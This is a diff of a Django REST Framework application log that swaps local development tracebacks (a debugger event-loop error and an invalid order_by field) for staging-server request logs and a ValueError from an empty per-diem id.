-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/viewsets.py", line 116, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 483, in dispatch
-    self.initial(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 455, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 483, in dispatch
-    self.initial(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 401, in initial
-    self.check_permissions(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 333, in check_permissions
-    for permission in self.get_permissions():
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/api/views.py", line 22, in get_permissions
-    permission_classes = []
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/api/views.py", line 22, in get_permissions
-    permission_classes = []
-  File "/usr/lib/python3.7/bdb.py", line 88, in trace_dispatch
-    return self.dispatch_line(frame)
-  File "/usr/lib/python3.7/bdb.py", line 112, in dispatch_line
-    self.user_line(frame)
-  File "/usr/lib/python3.7/pdb.py", line 259, in user_line
-    self.interaction(frame, None)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/IPython/core/debugger.py", line 294, in interaction
-    OldPdb.interaction(self, frame, traceback)
-  File "/usr/lib/python3.7/pdb.py", line 350, in interaction
-    self._cmdloop()
-  File "/usr/lib/python3.7/pdb.py", line 319, in _cmdloop
-    self.cmdloop()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/IPython/terminal/debugger.py", line 91, in cmdloop
-    line = self.pt_app.prompt() # reset_current_buffer=True)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/shortcuts/prompt.py", line 738, in prompt
-    return run_sync()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/shortcuts/prompt.py", line 727, in run_sync
-    return self.app.run(inputhook=self.inputhook, pre_run=pre_run2)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/application/application.py", line 709, in run
-    return run()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/application/application.py", line 682, in run
-    run_until_complete(f, inputhook=inputhook)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/eventloop/defaults.py", line 123, in run_until_complete
-    return get_event_loop().run_until_complete(future, inputhook=inputhook)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/eventloop/posix.py", line 57, in run_until_complete
-    raise Exception('Event loop is already running')
-Exception: Event loop is already running
-ERROR|19/May/2021 16:01:44|basehttp|3768|140541284693760|"GET /users/ HTTP/1.1" 500 171383
-INFO|19/May/2021 16:01:52|basehttp|3768|140541293086464|"GET /users HTTP/1.1" 301 0
-ERROR|19/May/2021 16:01:52|log|3768|140541007771392|Internal Server Error: /users/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/viewsets.py", line 116, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 483, in dispatch
-    self.initial(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 455, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 483, in dispatch
-    self.initial(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 401, in initial
-    self.check_permissions(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 333, in check_permissions
-    for permission in self.get_permissions():
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/api/views.py", line 22, in get_permissions
-    permission_classes = []
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/api/views.py", line 22, in get_permissions
-    permission_classes = []
-  File "/usr/lib/python3.7/bdb.py", line 88, in trace_dispatch
-    return self.dispatch_line(frame)
-  File "/usr/lib/python3.7/bdb.py", line 112, in dispatch_line
-    self.user_line(frame)
-  File "/usr/lib/python3.7/pdb.py", line 259, in user_line
-    self.interaction(frame, None)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/IPython/core/debugger.py", line 294, in interaction
-    OldPdb.interaction(self, frame, traceback)
-  File "/usr/lib/python3.7/pdb.py", line 350, in interaction
-    self._cmdloop()
-  File "/usr/lib/python3.7/pdb.py", line 319, in _cmdloop
-    self.cmdloop()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/IPython/terminal/debugger.py", line 91, in cmdloop
-    line = self.pt_app.prompt() # reset_current_buffer=True)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/shortcuts/prompt.py", line 738, in prompt
-    return run_sync()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/shortcuts/prompt.py", line 727, in run_sync
-    return self.app.run(inputhook=self.inputhook, pre_run=pre_run2)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/application/application.py", line 709, in run
-    return run()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/application/application.py", line 682, in run
-    run_until_complete(f, inputhook=inputhook)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/eventloop/defaults.py", line 123, in run_until_complete
-    return get_event_loop().run_until_complete(future, inputhook=inputhook)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/prompt_toolkit/eventloop/posix.py", line 57, in run_until_complete
-    raise Exception('Event loop is already running')
-Exception: Event loop is already running
-ERROR|19/May/2021 16:01:52|basehttp|3768|140541007771392|"GET /users/ HTTP/1.1" 500 171384
-INFO|19/May/2021 16:02:04|basehttp|3768|140540792272640|"GET / HTTP/1.1" 200 9567
-WARNING|19/May/2021 16:19:40|log|5420|139879729682176|Unauthorized: /get_currency_conversion/
-WARNING|19/May/2021 16:19:40|basehttp|5420|139879729682176|"GET /get_currency_conversion/?from_currency=INR&to_currency=USD HTTP/1.1" 401 58
-INFO|19/May/2021 16:20:40|basehttp|5420|139879729682176|"POST /api/custom/login/ HTTP/1.1" 200 455
-INFO|19/May/2021 16:20:53|basehttp|5420|139879729682176|"GET /get_currency_conversion/?from_currency=INR&to_currency=USD HTTP/1.1" 200 574
-INFO|19/May/2021 16:21:19|basehttp|5609|140092537792256|"GET /get_currency_conversion/?from_currency=INR&to_currency=USD HTTP/1.1" 200 574
-INFO|19/May/2021 16:21:20|basehttp|5609|140092537792256|"GET /get_currency_conversion/?from_currency=INR&to_currency=USD HTTP/1.1" 200 574
-ERROR|19/May/2021 16:21:58|log|5676|140477563193088|Internal Server Error: /get_currency_conversion/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
     response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
     response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
     return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
     return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 495, in dispatch
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
     response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 455, in handle_exception
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
     self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 492, in dispatch
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
     response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/master/views/currency.py", line 283, in get
-    currency = self.get_queryset(request.GET['from_currency'],request.GET['to_currency'])
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/master/views/currency.py", line 278, in get_queryset
-    currency = Currency_Conversion.objects.filter(from_currency=from_currency,to_currency=to_currency).order_by('~conversion_date')
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 1023, in order_by
-    obj.query.add_ordering(*field_names)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1776, in add_ordering
-    raise FieldError('Invalid order_by arguments: %s' % errors)
-django.core.exceptions.FieldError: Invalid order_by arguments: ['~conversion_date']
-ERROR|19/May/2021 16:21:58|basehttp|5676|140477563193088|"GET /get_currency_conversion/?from_currency=INR&to_currency=USD HTTP/1.1" 500 20269
-INFO|19/May/2021 16:22:07|basehttp|5730|140309998548736|"GET /get_currency_conversion/?from_currency=INR&to_currency=USD HTTP/1.1" 200 574
-INFO|19/May/2021 16:29:29|basehttp|5784|140714835560192|"GET /currency_conversion_history/?from_date=2020-8-5&to_date=2021-5-19&from_currency=INR&to_currency=USD HTTP/1.1" 200 63
-INFO|19/May/2021 16:31:30|basehttp|6163|139926585964288|"GET /currency_conversion_history/?from_date=2020-8-5&to_date=2021-5-19&from_currency=INR&to_currency=AMD HTTP/1.1" 200 566
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/master/views/currency.py", line 135, in post
+    perdiem =Per_Diem.objects.filter(id=request.data['id']).first()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 841, in filter
+    return self._filter_or_exclude(False, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
+    clone.query.add_q(Q(*args, **kwargs))
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1263, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
+    split_subq=split_subq,
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1225, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1096, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/lookups.py", line 20, in __init__
+    self.rhs = self.get_prep_lookup()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/lookups.py", line 70, in get_prep_lookup
+    return self.lhs.output_field.get_prep_value(self.rhs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/fields/__init__.py", line 965, in get_prep_value
+    return int(value)
+ValueError: invalid literal for int() with base 10: ''
+ERROR|20/May/2021 11:03:01|basehttp|848182|139747540322048|"POST /get_post_per_diem/ HTTP/1.1" 500 20734
+ERROR|20/May/2021 11:03:45|log|848182|139747540322048|Internal Server Error: /get_post_per_diem/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/master/views/currency.py", line 135, in post
+    perdiem =Per_Diem.objects.filter(id=request.data['id']).first()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 841, in filter
+    return self._filter_or_exclude(False, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
+    clone.query.add_q(Q(*args, **kwargs))
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1263, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
+    split_subq=split_subq,
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1225, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1096, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/lookups.py", line 20, in __init__
+    self.rhs = self.get_prep_lookup()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/lookups.py", line 70, in get_prep_lookup
+    return self.lhs.output_field.get_prep_value(self.rhs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/fields/__init__.py", line 965, in get_prep_value
+    return int(value)
+ValueError: invalid literal for int() with base 10: ''
+ERROR|20/May/2021 11:03:45|basehttp|848182|139747540322048|"POST /get_post_per_diem/ HTTP/1.1" 500 20734
+INFO|20/May/2021 11:06:35|basehttp|848182|139747648177920|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|20/May/2021 11:06:35|basehttp|848182|139747540322048|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|20/May/2021 11:06:35|basehttp|848182|139747540322048|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|20/May/2021 11:06:35|basehttp|848182|139747648177920|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 33857
+INFO|20/May/2021 11:06:35|basehttp|848182|139747565500160|"GET /get_add/currency/ HTTP/1.1" 200 125173
+INFO|20/May/2021 11:07:32|basehttp|848182|139747565500160|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|20/May/2021 11:07:32|basehttp|848182|139747648177920|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|20/May/2021 11:07:32|basehttp|848182|139747540322048|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|20/May/2021 11:07:32|basehttp|848182|139747565500160|"GET /get_add/currency/ HTTP/1.1" 200 125173
+INFO|20/May/2021 11:07:32|basehttp|848182|139747648177920|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 33857
+ERROR|20/May/2021 11:08:02|log|848182|139747648177920|Internal Server Error: /get_post_per_diem/
+Traceback (most recent call last):
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 126, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/core/handlers/base.py", line 124, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/views/generic/base.py", line 68, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 495, in dispatch
+    response = self.handle_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 455, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/rest_framework/views.py", line 492, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/mobilitysqr_staging/mobility_apps/master/views/currency.py", line 135, in post
+    perdiem =Per_Diem.objects.filter(id=request.data['id']).first()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 841, in filter
+    return self._filter_or_exclude(False, *args, **kwargs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
+    clone.query.add_q(Q(*args, **kwargs))
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1263, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
+    split_subq=split_subq,
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1225, in build_filter
+    condition = self.build_lookup(lookups, col, value)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/sql/query.py", line 1096, in build_lookup
+    lookup = lookup_class(lhs, rhs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/lookups.py", line 20, in __init__
+    self.rhs = self.get_prep_lookup()
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/lookups.py", line 70, in get_prep_lookup
+    return self.lhs.output_field.get_prep_value(self.rhs)
+  File "/var/www/html/mobilitysqr_api/mobilitysqr_staging_virtualenv/lib64/python3.6/site-packages/django/db/models/fields/__init__.py", line 965, in get_prep_value
+    return int(value)
+ValueError: invalid literal for int() with base 10: ''
+ERROR|20/May/2021 11:08:02|basehttp|848182|139747648177920|"POST /get_post_per_diem/ HTTP/1.1" 500 20734
+INFO|20/May/2021 11:08:56|basehttp|848182|139747565500160|"POST /get_post_per_diem/ HTTP/1.1" 201 661
+INFO|20/May/2021 11:08:56|basehttp|848182|139747565500160|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 34458
+INFO|20/May/2021 11:09:05|basehttp|848182|139747565500160|"OPTIONS /get_post_per_diem/?organization=ORG150866&home_country=India HTTP/1.1" 200 0
+INFO|20/May/2021 11:09:05|basehttp|848182|139747565500160|"GET /get_post_per_diem/?organization=ORG150866&home_country=India HTTP/1.1" 200 1863
+INFO|20/May/2021 11:12:35|basehttp|848182|139747648177920|"GET /getemployee_org_info/?employee=div944 HTTP/1.1" 200 43
+INFO|20/May/2021 11:12:35|basehttp|848182|139747565500160|"GET /get_post_notification/?email=div944&org_id=ORG150866 HTTP/1.1" 200 63
+INFO|20/May/2021 11:12:35|basehttp|848182|139747648177920|"GET /get_country_master/?country= HTTP/1.1" 200 58715
+INFO|20/May/2021 11:12:35|basehttp|848182|139747565500160|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 34458
+INFO|20/May/2021 11:12:35|basehttp|848182|139747540322048|"GET /get_add/currency/ HTTP/1.1" 200 125173
+INFO|20/May/2021 11:13:02|basehttp|848182|139747540322048|"GET /get_post_per_diem/?organization=ORG150866&home_country=India HTTP/1.1" 200 1863
+INFO|20/May/2021 11:13:14|basehttp|848182|139747540322048|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 34458
+INFO|20/May/2021 11:14:52|basehttp|848182|139747540322048|"POST /get_post_per_diem/ HTTP/1.1" 201 667
+INFO|20/May/2021 11:14:53|basehttp|848182|139747540322048|"GET /get_post_per_diem/?organization=ORG150866 HTTP/1.1" 200 34463
+INFO|20/May/2021 11:15:11|basehttp|848182|139747540322048|"GET /get_post_per_diem/?organization=ORG150866&home_country=India HTTP/1.1" 200 2470
+INFO|20/May/2021 11:17:57|basehttp|848182|139747548714752|"GET /getemployee_visa_info/?employee=div944 HTTP/1.1" 200 43
+INFO|20/May/2021 11:17:57|basehttp|848182|139747648177920|"GET /get_travel_request_approver_top/?emp_email=div944&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 48
+INFO|20/May/2021 11:17:57|basehttp|848182|139747529307904|"GET /post_get_calender_event/?emp_code=div944 HTTP/1.1" 200 48
+INFO|20/May/2021 11:17:57|basehttp|848182|139747540322048|"GET /getemployee_passport_info/?employee=div944 HTTP/1.1" 200 805
+INFO|20/May/2021 11:17:57|basehttp|848182|139747540322048|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 84
+INFO|20/May/2021 11:17:58|basehttp|848182|139747565500160|"GET /org_travel_request/?travel_req_status=2&org_id=ORG150866&current_ticket_email=div944 HTTP/1.1" 200 20141
+INFO|20/May/2021 11:17:59|basehttp|848182|139747557107456|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=div944 HTTP/1.1" 200 43838
+INFO|20/May/2021 11:18:06|basehttp|848182|139747557107456|"POST /api/custom/login/ HTTP/1.1" 200 74
+INFO|20/May/2021 11:18:15|basehttp|848182|139747557107456|"POST /api/custom/login/ HTTP/1.1" 200 74
+INFO|20/May/2021 11:18:19|basehttp|848182|139747557107456|"POST /api/custom/login/ HTTP/1.1" 200 74
+INFO|20/May/2021 11:18:29|basehttp|848182|139747557107456|"POST /api/custom/login/ HTTP/1.1" 200 452
+INFO|20/May/2021 11:18:29|basehttp|848182|139747557107456|"POST /emoloyeeinfo/ HTTP/1.1" 200 1507
+INFO|20/May/2021 11:18:29|basehttp|848182|139747557107456|"OPTIONS /get_post_notification/?email=Emp112&org_id=ORG150866 HTTP/1.1" 200 0
+INFO|20/May/2021 11:18:29|basehttp|848182|139747557107456|"OPTIONS /getemployee_org_info/?employee=Emp112 HTTP/1.1" 200 0
+INFO|20/May/2021 11:18:29|basehttp|848182|139747557107456|"OPTIONS /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=Emp112 HTTP/1.1" 200 0
+INFO|20/May/2021 11:18:29|basehttp|848182|139747540322048|"OPTIONS /get_travel_request_approver_top/?emp_email=Emp112&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 0
+INFO|20/May/2021 11:18:29|basehttp|848182|139747565500160|"OPTIONS /getemployee_visa_info/?employee=Emp112 HTTP/1.1" 200 0
+INFO|20/May/2021 11:18:29|basehttp|848182|139747529307904|"OPTIONS /getemployee_passport_info/?employee=Emp112 HTTP/1.1" 200 0
+INFO|20/May/2021 11:18:29|basehttp|848182|139747529307904|"OPTIONS /post_get_calender_event/?emp_code=Emp112 HTTP/1.1" 200 0
+INFO|20/May/2021 11:18:29|basehttp|848182|139747540322048|"OPTIONS /get_travel_count_user/?emp_code=Emp112 HTTP/1.1" 200 0
+INFO|20/May/2021 11:18:29|basehttp|848182|139747565500160|"GET /media/Roy.png HTTP/1.1" 304 0
+INFO|20/May/2021 11:18:29|basehttp|848182|139747565500160|"GET /getemployee_org_info/?employee=Emp112 HTTP/1.1" 200 43
+INFO|20/May/2021 11:18:30|basehttp|848182|139747540322048|"GET /get_post_notification/?email=Emp112&org_id=ORG150866 HTTP/1.1" 200 5702
+INFO|20/May/2021 11:18:30|basehttp|848182|139747565500160|"GET /getemployee_visa_info/?employee=Emp112 HTTP/1.1" 200 699
+INFO|20/May/2021 11:18:30|basehttp|848182|139747540322048|"GET /getemployee_passport_info/?employee=Emp112 HTTP/1.1" 200 1576
+INFO|20/May/2021 11:18:30|basehttp|848182|139747648177920|"GET /get_travel_count_user/?emp_code=Emp112 HTTP/1.1" 200 83
+INFO|20/May/2021 11:18:30|basehttp|848182|139747557107456|"GET /get_travel_request_approver_top/?emp_email=Emp112&travel_req_status=2&type=Travel&org_id=ORG150866&limit=5 HTTP/1.1" 200 8018
+INFO|20/May/2021 11:18:30|basehttp|848182|139747565500160|"GET /post_get_calender_event/?emp_code=Emp112 HTTP/1.1" 200 16283
+INFO|20/May/2021 11:18:32|basehttp|848182|139747529307904|"GET /get_add/travel_request/?travel_req_status=2&org_id=ORG150866&emp_email=Emp112 HTTP/1.1" 200 109164
+INFO|20/May/2021 11:18:58|basehttp|848182|139747529307904|"GET /getemployee_org_info/?employee=Emp112 HTTP/1.1" 200 43
